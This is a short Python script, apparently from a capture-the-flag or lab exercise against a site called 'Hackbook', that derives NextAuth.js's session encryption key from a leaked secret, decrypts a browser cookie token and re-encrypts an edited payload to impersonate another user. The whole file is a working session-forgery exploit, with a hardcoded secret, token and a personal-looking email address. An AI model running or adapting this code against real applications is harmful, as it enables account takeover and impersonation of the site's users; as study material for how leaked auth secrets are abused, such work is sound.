from Crypto.Protocol.KDF import HKDF # pip install pycryptodome
from Crypto.Hash import SHA256
import base64
from jwcrypto import jwk, jwe # pip install jwcrypto
from jwcrypto.common import json_encode

# Create the derived encryption key (by analysing the source code of Next Auth we find the different parameters)
def getDerivedEncryptionKey(secret):
    return HKDF(
        master=secret.encode(),
        key_len=32,
        salt="".encode(),
        hashmod=SHA256,
        num_keys=1,
        context=b"NextAuth.js Generated Encryption Key",
    )

# Decrypt the JWE and return the payload
def jwe_decrypt(enc, key):
    encJWK = {"k": base64.urlsafe_b64encode(key).decode(), "kty": "oct"}
    encKey = jwk.JWK(**encJWK)
    jwetoken = jwe.JWE()
    jwetoken.deserialize(enc, encKey)
    return jwetoken.payload

# Encrypt the payload to create a JWE
def jwe_encrypt(payload, key):
    encJWK = {"k": base64.urlsafe_b64encode(key).decode(), "kty": "oct"}
    encKey = jwk.JWK(**encJWK)
    jwetoken = jwe.JWE(payload, json_encode({"alg": "A256KW", "enc": "A256CBC-HS512"}))
    jwetoken.add_recipient(encKey)
    return jwetoken.serialize(True)
    
### Put here the token retrieved in browser cookies && the secret key used by Hackbook ###
token = 'eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIn0..QIwbYkiMtMcQ4rtp.jcjk4pU8Hnl_9JCicUdVC6n04AgGQ8FI8-O_x_OGL_SOKOrUy4T9YnlHf91zsAVrP1P0SVQ50gCoHP_Q28HAcsB2I-zlibGWze_AvaZSHSQH_CURD6Vr6kJllMRgAGe7Sxc-mNwHRjbHm-5nn1l0C2HntMNc0k667hqDS8m7Qs3srx_rEBzfUnMN_AM9PwvSKe7cQr4fNaw.9vy_8s0_K1RqVatQKs-ywQ'
secret = "rZ89pGVSoN4QQm0Clemw3+HtZKemLuulgtzg1I9vFuo="

# Derivate the key
encryption_key = getDerivedEncryptionKey(secret)

# Decrypt the token
payload = jwe_decrypt(token, encryption_key)

print("JWT in JSON : " + payload.decode())

print("")

### Put here the new payload ###
new_payload = '{"name":"Lea","email":"lea.leroux.gribouille@gmail.com","sub":"4","id":4,"iat":1677535626,"exp":1680127626,"jti":"639154eb-a1cb-4f5d-9ca6-5b5d88b211f8"}'

# Encrypt the new payload
new_token = jwe_encrypt(new_payload, encryption_key)

print("JWE : " + new_token)

